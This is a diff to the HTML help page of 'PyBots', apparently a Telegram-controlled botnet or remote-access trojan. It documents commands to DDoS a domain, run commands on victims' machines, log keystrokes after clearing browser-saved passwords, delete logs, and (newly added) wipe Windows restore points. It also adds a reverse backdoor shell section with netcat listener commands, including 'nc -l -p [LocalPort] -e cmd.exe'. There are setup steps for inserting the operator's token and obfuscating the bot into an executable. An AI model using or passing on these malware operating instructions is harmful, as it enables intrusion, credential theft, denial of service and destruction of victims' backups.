@@ -45,6 +45,7 @@
               <li><a href="#cp_install">Install</a></li>
               <li><a href="#cp_configuration">Config</a></li>
               <li><a href="#cp_commands">Commands</a></li>
+              <li><a href="#cp_backConnect">BackConnect</a></li>
             </ul>
           </li>
         </ul>
@@ -64,8 +65,8 @@
             <li>find admin and token in PyBots.py and replace yours:</li>
             <br>
                 <table class="list">
-                    <tr><td>130</td><td>admin =  "add telegram number id here"</td></tr>
-                    <tr><td>131</td><td>token =  "add token here"</td></tr>
+                    <tr><td>Line 18</td><td>admin =  "add telegram number id here"</td></tr>
+                    <tr><td>Line 19</td><td>token =  "add token here"</td></tr>
                 </table>
             <br>
             <li>for obfuscate and create executable file, just run this command:</li>
@@ -83,14 +84,20 @@
             <tr><td>/shutUp</td><td>all online bots will down.</td></tr>
             <tr><td>/d_dos domain</td><td>all online bots attack to domain.</td></tr>
             <tr><td>/power commands</td><td>commands execute on target, linux and windows.</td></tr>
-            <tr><td>/backConnect yourIp:port</td><td>python BackConnect will run.</td></tr>
             <tr><td>/clearPass</td><td>clear keys on chrome and Firefox for keyLogger attack, linux and windows.</td></tr>
             <tr><td>/keys</td><td>start keyLogger to listen.</td></tr>
             <tr><td>/downKeys</td><td>download the keyLogger file and Delete logs on target.</td></tr>
+            <tr><td>/clearBackups</td><td>clear restore points on target.(windows)</td></tr>
             <tr><td>/reStart</td><td>reboot the target.</td></tr>
             <tr><td>/shutDown</td><td>power off the target.</td></tr>
         </table>
 
+        <h2 id="cp_backConnect">BackConnect</h2>
+        <table class="list">
+            <tr><td>Reverse backdoor shell on target:</td><td>/backConnect yourIp:port</td></tr>
+            <tr><td>Listening backdoor shell on Linux:</td><td>nc -l -p [LocalPort]</td></tr>
+            <tr><td>Listening backdoor shell on Windows:</td><td>nc -l -p [LocalPort] -e cmd.exe</td></tr>
+        </table>
 
     </body>
 </html>
